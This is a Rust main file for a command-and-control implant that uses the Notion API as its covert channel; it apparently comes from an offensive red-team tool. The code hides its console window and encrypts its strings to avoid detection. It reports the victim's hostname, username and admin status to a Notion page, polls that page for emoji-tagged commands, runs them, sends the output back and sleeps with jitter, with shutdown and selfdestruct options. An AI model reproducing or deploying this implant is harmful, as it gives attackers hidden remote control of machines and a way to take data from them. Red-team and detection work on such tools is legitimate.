#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
extern crate reqwest;
extern crate tokio;
extern crate serde_json;
extern crate whoami;
extern crate base64;
#[macro_use]
extern crate litcrypt;

use std::{thread, time};
use std::env::args;
use std::process::exit;
use std::process::Command;
use rand::prelude::*;

use whoami::hostname;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
use base64::decode;

mod config;
use config::{
    ConfigOptions,
    get_config_options, 
    get_config_options_debug,
    load_config_options
};

mod notion;
use notion::{get_blocks, complete_command, create_page, send_result};

mod cmd;
use cmd::{NotionCommand, CommandType};
mod logger;

// Used to encrypt strings
use_litcrypt!();

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    println!("[*] Starting!");
    
    // Handle config options
    let mut config_options: ConfigOptions;

    // Check for command line options
    // -d: debug mode
    // -c: config file
    // -b: ingest base64 decode
    match args().nth(1) {
        Some(a) => {
            if a == "-d" {
                // Set up async handle for debug
                let config_options_handle = tokio::spawn( async {
                    return get_config_options_debug();
                });
                config_options = config_options_handle.await?.unwrap();
            // Handle alternative config file location
            } else if a == "-c" {
                let config_file_path = args().nth(2).unwrap();
                config_options = load_config_options(Some(config_file_path.as_str())).await?;
            } else if a == "-b" { 
                let b64_string = args().nth(2).unwrap().replace(" ", "");
                let config_string = String::from_utf8(
                    decode(b64_string.as_str())?
                )?;
                config_options = serde_json::from_str(config_string.as_str())?;
            } else {
                config_options = get_config_options().await?;
            }
        },
        None => {
            config_options = load_config_options(None).await?;
        }
    }

    let logger = logger::Logger::new(config_options.log_level);

    // Start Notion App if configured to do so
    if config_options.launch_app {
        logger.info("Launching app".to_string());
        let browser_cmd: &str;
        #[cfg(windows)] {
            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
        }
        #[cfg(not(windows))] {
            browser_cmd = "/usr/local/bin/google-chrome";
        }
        match Command::new(browser_cmd)
        .arg("--app=https://notion.so")
        .spawn() {
            Ok(_) => {logger.info("Launching browser".to_string());},
            Err(e) => {logger.err(e.to_string());}
        };
    }
    
    let mut hn = hostname();

    let username = whoami::username();
    hn.push_str(" | ");
    hn.push_str(&username);
    let is_admin = cmd::getprivs::is_elevated();  
    logger.info(format!("Admin context: {}", is_admin));
    if is_admin {
        hn.push_str("*");
    }

    logger.info(format!("Hostname: {hn}"));
    logger.debug(format!("Config options: {:?}", config_options));

    let mut headers = HeaderMap::new();
    headers.insert("Notion-Version", "2021-08-16".parse()?);
    headers.insert(CONTENT_TYPE, "application/json".parse()?);
    headers.insert(AUTHORIZATION, format!("Bearer {}", config_options.api_key).parse()?);
    let client = Client::builder()
        .default_headers(headers)
        .build()?;

    let page_id = create_page(&client, &config_options, hn, &logger)
        .await
        .unwrap();
    
    loop {
        // Get Blocks
        let blocks = get_blocks(&client, &page_id).await?;

        let command_blocks: Vec<&serde_json::Value> = blocks
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&b| b["type"] == "to_do")
            .collect();

        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
            .into_iter()
            .filter(|&b| b["to_do"]["checked"] == false)
            .collect();

        for block in new_command_blocks {
            match block["to_do"]["text"][0]["text"]["content"].as_str() {
                Some(s) => {
                    if s.contains("🎯") {
                        logger.info(format!("Got command: {s}"));
                        let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                        let output = notion_command.handle(&mut config_options, &logger).await?;
                        let command_block_id = block["id"].as_str().unwrap();
                        complete_command(&client, block.to_owned(), &logger).await;
                        send_result(&client, command_block_id, output, &logger).await;
                        // Check for any final work based on command type,
                        // Like shutting down the agent
                        match notion_command.command_type {
                            CommandType::Shutdown => {exit(0);},
                            CommandType::Selfdestruct => {exit(0)},
                            _ => {}
                        }
                    };

                },
                None => { continue; }
            }
        }

        // Handle jitter
        let mut rng = rand::thread_rng();
        let jitter_time = rng.gen_range(0..config_options.jitter_time + 1);
        let sleep_time = 
            time::Duration::from_secs(config_options.sleep_interval + jitter_time);

        thread::sleep(sleep_time);
        logger.info(format!("zzzZZZzzz: {} seconds", config_options.sleep_interval));
        logger.debug(format!("Jitter: {}", config_options.jitter_time));
    }
}
